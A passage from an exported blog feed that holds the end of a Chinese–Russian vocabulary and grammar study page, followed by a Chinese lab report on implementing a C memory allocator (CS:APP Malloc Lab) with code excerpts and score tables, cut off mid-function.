Москве</li><li>住在上海 жить в Шанхае</li><li>背单词 учить новые слова</li><li>渴望上大学 хотеть учиться в университете</li><li>渴望在俄罗斯留学 хотеть учиться в России</li><li>关于我 обо мне</li><li>3点钟 три часа</li><li>5点钟 пять часов</li><li>看电视 смотреть телевизор</li><li>看书 читать книгу</li><li>寻找教科书 искать учебник</li><li>请问 скажите пожалуйста</li><li>几点钟 который час</li><li>很好 очень хорошо</li></ul><h4 id="第七课词组"><a href="#第七课词组" class="headerlink" title="第七课词组"></a>第七课词组</h4><ol><li>俄语学院 Институт русского языка</li><li>学习研究俄语 изучать русский язык</li><li>在课堂上 на уроке </li><li>回答问题 отвечать на вопросы</li><li>做很多练习 делать упражнения</li><li>懂俄语 знать русский язык</li><li>谈论有关学习和生活的事情 разговаривать об учёбе и о жизни</li><li>学院里的生活 жизнь в институте</li><li>向往着留学俄罗斯 мечтать учиться в России</li><li>去上班 идти на работу </li><li>乘车去莫斯科 ехать в Москву</li><li>喜欢春天 любить весну</li><li>报刊和杂志 газета и журнал</li></ol><h4 id="第九课词组"><a href="#第九课词组" class="headerlink" title="第九课词组"></a>第九课词组</h4><ol><li>写生词 писать новые слова</li><li>看电视 смотреть телевизор</li><li>在教室里上自习 заниматься в аудитории</li><li>在宿舍休息 отдыхать в общежитии</li><li>好朋友  большие друзья (хорошие друзья)</li><li>喜欢数学 любить математику</li><li>做家庭作业 делать домашние задания</li><li>出行日 выходной день</li><li>弹吉他  играть на гитаре</li><li>乘车去听音乐会  ехать на концерт</li><li>看电影  смотреть фильм</li><li>好久没见到你 давно тебя не видеть</li><li>在学院里等你 ждать тебя в институте</li><li>上大学 учиться в университете</li><li>唱俄语歌 петь русские песни</li><li>在莫大学习 учиться в МГУ</li><li>中小学同学 школьные товарищи</li></ol><h4 id="第十课词组"><a href="#第十课词组" class="headerlink" title="第十课词组"></a>第十课词组</h4><ol><li>出生在莫斯科 родиться в Москве</li><li>在中学工作 работать в средней школе</li><li>大而美丽的城市 большой и красивый город</li><li>长江 река Янцзы</li><li>在童年 в детстве</li><li>在北大上学 учиться в Пекинском университете</li><li>俄罗斯语言与文学 русский язык и литература</li><li>每天 каждый день</li><li>除此以外 кроме того</li><li>听俄语诗歌 слушать русские стихи</li><li>好教师 хороший преподаватель</li><li>令人愉悦的和善良的人 весёлый и добрый человек</li><li>熟知故乡的城市 хорошо знать свой родной город</li><li>喜欢听他的故事 любить слушать его рассказы</li><li>著名的地方 знаменитые места</li><li>红场 Красная площадь</li><li>历史博物馆 Исторический музей</li><li>大剧院 Большой театр</li><li>冬宫 Зимний дворец</li><li>晚报 вечерняя газета</li><li>我的父母双亲 мои родители</li></ol><h4 id="重点词组"><a href="#重点词组" class="headerlink" title="重点词组"></a>重点词组</h4><ol><li>吃新鲜的菠萝 есть свежие ананасы</li><li>吃热汤 есть горячий суп</li><li>读书和报刊杂志 читать книгу, газету и журнал</li><li>听音乐 слушать музыку</li><li>在美丽的花园里散步 гулять в красивом саду</li><li>在周六  в субботу</li><li>谈论关于我的情况  разговаривать обо мне</li><li>乘公共汽车  ехать на автобусе</li><li>乘坐地铁  ехать на метро</li><li>谈论关于我的生活和工作  разговаривать о моей жизни и работе</li><li>飞往莫斯科 лететь в Москву</li><li>师范学院  педагогический институт</li><li>医学院  медицинский институт</li><li>历史系  исторический факультет</li><li>一年四季  времена года</li><li>站在喷泉旁 стоять у фонтана</li><li>背单词 учить новые слова</li><li>6点钟 шесть часов</li><li>唱歌跳舞 петь и танцевать</li><li>回忆起学校和老师同学 вспоминать о школе, об учителях и товарищах</li><li>高楼  большие дома</li><li>起床很早 вставать рано</li><li>他有课 у него уроки</li><li>购买蔬菜和苹果 покупать овощи и яблоки</li><li>回答问题 отвечать на вопросы</li><li>去上班 идти на работу</li><li>梦想在俄罗斯学习 мечтать учиться в России</li><li>美丽的花朵 красивые цветы</li><li>写信 писать письмо</li><li>在小吃部吃午饭 обедать в буфете</li></ol><h4 id="形容词"><a href="#形容词" class="headerlink" title="形容词"></a>形容词</h4><p><strong>硬变化</strong></p><ul><li>新的 новый, новая, новое, новые;</li><li>旧的 старый, старая, старое, старые;</li><li>美丽的 красивый, красивая, красивое, красивые;</li><li>美味的 вкусный, вкусная, вкусное, вкусные;</li><li>时尚的 модный, модная, модное, модные;</li><li>红色的 красный, красная, красное, красные;</li><li>学校的 школьный, школьная, школьное, школьные;</li><li>年青的 молодой, молодая, молодое, молодые; </li><li>大的 большой, большая, большое, большие; </li><li>不好的 плохой，плохая, плохое, плохие; </li><li>英国的  английский, английская, английское, английские;</li></ul><p><strong>软变化</strong></p><ul><li>家庭的 домашний, домашняя, домашнее, домашние; </li><li>蓝色的 синий, синяя, синее, синие; </li><li>晚上的 вечерний，вечерняя, вечернее, вечерние; </li><li>冬日的 зимний, зимняя, зимнее, зимние; </li><li>好的 хороший，хорошая, хорошее, хорошие; </li><li>新鲜的 свежий，свежая, свежее, свежие; </li><li>滚烫的 горячий, горячая, горячее, горячие.</li></ul><h4 id="на-固定词组-第四格"><a href="#на-固定词组-第四格" class="headerlink" title="на 固定词组 (第四格)"></a>на 固定词组 (第四格)</h4><p>на завод, на рынок, на мост, на работу, на урок, на лекцию, на выставку, на концерт, на почту, на кухню, на фирму, на улицу, на проспект, на стадион, на остановку автобуса, на обед, на ужин, на завтрак, на собрание, на юг, на вокзал, на футбол, на гору, на занятия, на факультет, на реку, на озеро, на поле, на море.</p><h4 id="об-固定词组-第六格"><a href="#об-固定词组-第六格" class="headerlink" title="об 固定词组 (第六格)"></a>об 固定词组 (第六格)</h4><p>обо мне, об учёбе, об аудитории, об общежитии, об уксусе, об автобусе, об остановке, об ухе, об яйце, об языке, об ужине, об Европе, об Азии, об имени, об Интернете, об отце, об юге, об овощах, об обуви, об обеде, об осени, об озере, об июле, об июне, об улице, об учителе, об учительнице, об январе, об апреле, об августе, об октябре.</p><h4 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h4><ol><li><p>Кто твой отец? </p><p>Мой отец инженер. Он работает на заводе.</p></li><li><p>Что стоит на столе? </p><p>На столе стоят красивые цветы.</p></li><li><p>Что ты читаешь? </p><p>Я читаю книгу и газету.</p></li><li><p>Что делала Инна вчера вечером? </p><p>Вчера вечером она смотрела телевизор.</p></li><li><p>Какой язык ты знаешь? </p><p>Я знаю китайский и русский языки.</p></li><li><p>Который час сейчас?</p><p>Сейчас два часа.</p></li><li><p>Куда они едут?</p><p>Они едут в Москву.</p></li><li><p>Когда ты встаёшь утром каждый день? </p><p>Каждый день утром я встаю в шесть часов.</p></li><li><p>Где Миша учился раньше? </p><p>Раньше он учился в Санкт-Петербурге.</p></li><li><p>Где Виктор был вчера? </p><p>Вчера он был в институте.</p></li><li><p>Чья это машина? </p><p>Это моя машина.</p></li><li><p>Какой сегодня день? </p><p>Сегодня понедельник.</p></li><li><p>Почему Анна много работает? </p><p>Она хочет учиться в России.</p></li><li><p>Какое время года ты любишь? </p><p>Я люблю весну и зиму.</p></li><li><p>Где учится твой брат? </p><p>Мой брат учится в МГУ.</p></li><li><p>Ребята хорошо знают о тебе? </p><p>Да, они хорошо знают обо мне.</p></li><li><p>О чём вы разговариваете? </p><p>Мы разговариваем об учёбе и о жизни в университете.</p></li><li><p>О ком рассказывал ваш преподаватель сегодня на уроке? </p><p>Сегодня на уроке он рассказывал о великом русском поэте Пушкине.</p></li><li><p>В каком городе ты живёшь? </p><p>Я живу в большом и красивом городе Шанхае.</p></li><li><p>Где вы родились?</p><p>Я родился в Москве.</p></li><li><p>Где вы учились раньше? </p><p>Раньше мы учились в школе.</p></li><li><p>Какой язык они учили в школе? </p><p>В школе они учили английский язык.</p></li><li><p>Как вы говорите по-русски? </p><p>Мы говорим по-русски очень хорошо.</p></li><li><p>Где обычно занимаются студенты? </p><p>Они обычно занимаются в аудиториях и библиотеках.</p></li><li><p>Какой язык изучает Виктор? </p><p>Он изучает китайский язык.</p></li><li><p>Что ты делал вчера вечером? </p><p>Вчера вечером я писал новые слова.</p></li><li><p>Кто такой Антон? </p><p>Антон хороший преподаватель, весёлый и добрый человек.</p></li><li><p>Какой ваш родной город?</p><p>Мой родной город — Пекин.</p></li><li><p>Ты любишь изучать русский язык? </p><p>Да, я люблю изучать русский язык.</p></li><li><p>Когда у вас уроки русского языка? </p><p>У нас уроки русского языка во вторник и в пятницу.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 3</title>
      <link href="/43/"/>
      <url>/43/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-3-Malloc-Lab-实验报告"><a href="#Lab-3-Malloc-Lab-实验报告" class="headerlink" title="Lab 3 Malloc Lab 实验报告"></a>Lab 3 Malloc Lab 实验报告</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>使用 $C$ 语言实现一个 $Dynamic$ $Storage$ $Allocater$.</li><li>实现并优化 $malloc$, $free$, $realloc$ 等功能.</li><li>熟练 $gdb$ 调试技巧.</li></ul><h2 id="最终性能"><a href="#最终性能" class="headerlink" title="最终性能"></a>最终性能</h2><p>在最终提交的版本中, 我对 $mm.c$ 的相关实现策略如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Data Structure -------- Explicit Free List <span class="token punctuation">(</span>Double Linked List<span class="token punctuation">)</span>  / Allocated Block --- Header, Payload and Footer  <span class="token punctuation">\</span> Free Block -------- Header, Pred_ptr, Succ_ptr and FooterFit Strategy ---------- First FitCoalesce Strategy ----- Immediate CoalesceRealloc Strategy ------ First Try to Coalesce, Then Try to Malloc and Free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终实现的性能如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">46</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">86</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Version-0"><a href="#Version-0" class="headerlink" title="Version 0"></a>Version 0</h2><p>$Version$ $0$ 为未作任何修改的原始 $mm.c$ 文件, 直接进行测试的结果.</p><h3 id="Block-Structure"><a href="#Block-Structure" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>在原始 $mm.c$ 文件中, 一个 $block$ 没有 $header$ 或 $footer$ 标记, 也不会被 $coalesce$ 或 $reuse$.</p><h3 id="Helper-Functions"><a href="#Helper-Functions" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><ul><li>没有实现任何 $helper$ $function$ 以辅助进行内存块的分配.</li><li>所有内存块不进行 $coalesce$, 经过 $free$ 后不会被 $malloc$ 或 $realloc$ 复用.</li></ul><h3 id="Malloc-Functions"><a href="#Malloc-Functions" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h4><ul><li>不进行 $init$, 直接返回.</li></ul><h4 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><ul><li>将 $size$ 对齐至 $16$ 字节, 直接调用 $mem_sbrk$ 申请新的堆区域, 并返回一个指向连续内存块的指针.</li></ul><h4 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h4><ul><li>不进行 $free$, 直接返回.</li></ul><h4 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><ul><li>直接调用 $mm_malloc$ 分配 $newptr$. </li><li>如果 $newptr$ 为 $NULL$, 此时堆可扩展内存不足, 直接返回 $NULL$.</li><li>否则, 依据大小关系将 $ptr$ 指向的旧内存块内容复制到 $newptr$ 指向的新块.</li></ul><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">23</span>%    <span class="token number">5694</span>  <span class="token number">0.000070</span>  <span class="token number">81459</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">19</span>%    <span class="token number">5848</span>  <span class="token number">0.000072</span>  <span class="token number">81110</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">30</span>%    <span class="token number">6648</span>  <span class="token number">0.000084</span>  <span class="token number">78768</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">40</span>%    <span class="token number">5380</span>  <span class="token number">0.000066</span>  <span class="token number">82137</span> <span class="token number">5</span> coalescing-bal.rep        no     -       -         -      - <span class="token number">6</span>     random-bal.rep        no     -       -         -      - <span class="token number">7</span>    random2-bal.rep        no     -       -         -      - <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.000144</span>  <span class="token number">83624</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.000186</span> <span class="token number">128755</span><span class="token number">10</span>    realloc-bal.rep        no     -       -         -      -<span class="token number">11</span>   realloc2-bal.rep        no     -       -         -      -Total                               -       -         -      -Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">12</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">6</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">28</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>此时实现的分配器尚不能正确实现所有任务.</p><p>$Kops$ 满足要求, 但 $Memory$ $Utilization$ 过低.</p></blockquote><h2 id="Version-1"><a href="#Version-1" class="headerlink" title="Version 1"></a>Version 1</h2><p>参考 $CSAPP3e$ : $9.9.12$ 中的实现, 采用 $Implicit$ $Free$ $List$ 组织空闲块.</p><h3 id="Block-Structure-1"><a href="#Block-Structure-1" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>一个 $block$ 的结构被组织为:</p><p><img src="/pic/46.png"></p><p>考虑 $Boundary$ $Tags$ 与 $Alignment$ 条件, 此时 $minimum$ $block$ $size$ 为 $4 * WSIZE,(32,Bytes)$.</p><p>$Implicit$ $Free$ $List$ 被组织为:</p><p><img src="/pic/47.png"></p><p>其中 $heap_listp$ 初始默认指向 $Prologue$ $Block$, 而 $Epilogue$ $Block$ 在进行 $coalesce$ 时可以用于消除边界条件.</p><h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><p>相关 $Macro$ $Definition$ 完全参考了 $CSAPP3e$ : $9.9.12$ 中的实现.</p><h3 id="Helper-Functions-1"><a href="#Helper-Functions-1" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">first_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>bp <span class="token operator">=</span> heap_lo<span class="token punctuation">;</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>采用 $first$ $fit$ 查询 $free$ $block$, 其中 $heap_lo$ 为定义的 $Implicit$ $Free$ $List$ 的起始地址.</li><li>若 $no$ $fit$, 则返回 $NULL$.</li></ul><h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将大小为 $asize$ 的块放置在 $bp$ 指向的 $free$ $block$ 处. </li><li>由于 $minimum$ $block$ $size$ 为 $4 * WSIZE$, 若剩余 $payloader$ 的 $size$ 过大, 则进行 $split$ 操作产生一个新的 $free$ $block$.</li></ul><h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token class-name">size_t</span> prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">size_t</span> next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* Case 1 */</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">/* Case 2 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment">/* Case 3 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment">/* Case 4 */</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>采用 $immediate$ $coalesce$ 策略.</li><li>使用 $header$, $footer$ 作为 $boundary$ $tag$ 进行标记, 根据前后块的 $alloc$ $bit$ 位进行 $free$ $block$ 的合并.</li></ul><h4 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token punctuation">(</span>words <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>words <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> WSIZE <span class="token operator">:</span> words <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Free block header */</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* Free block footer */</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* New epilogue header */</span>  <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>用大小为 $size$ 的双字对齐的 $free$ $block$ 扩展堆.</li><li>$epilogue$ $block$ 的 $size$ 为 $0$, $alloc$ $bit$ 位置为 $1$.</li><li>使用 $mem_sbrk$ 分配一个双字对齐块后, $epilogue$ $block$ 变成了 $new$ $free$ $block$ $header$, 下一 $block$ $header$ 特殊化为 $new$ $epilogue$ $block$.</li></ul><h3 id="Malloc-Functions-1"><a href="#Malloc-Functions-1" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_lo <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span>heap_lo <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token 